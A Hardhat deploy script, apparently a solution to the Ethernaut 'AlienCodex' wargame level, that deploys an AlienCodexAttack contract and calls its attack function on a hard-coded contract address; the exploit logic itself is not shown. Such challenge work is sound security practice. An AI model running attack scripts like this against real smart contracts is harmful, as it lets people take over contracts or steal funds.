import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
import { AlienCodexAttack__factory } from '../../typechain-types';

const func:DeployFunction = async function (hre: HardhatRuntimeEnvironment){
    const alienCodexAddress = "0x0b103A2688cEb589990B8B354C5D2525FfD901Dd"

    console.log(">>>>deploy AlienCodexAttack");
    const AlienCodexAttack = await ethers.getContractFactory("AlienCodexAttack",(await ethers.getSigners())[0])as AlienCodexAttack__factory
    const alienCodexAttack = await AlienCodexAttack.deploy();
    await alienCodexAttack.deployed()

    const result = await alienCodexAttack.attack(alienCodexAddress)
    await result.wait();
    console.log("✅down");
    
}
export default func;
func.tags = ['AlienCodexAttack'];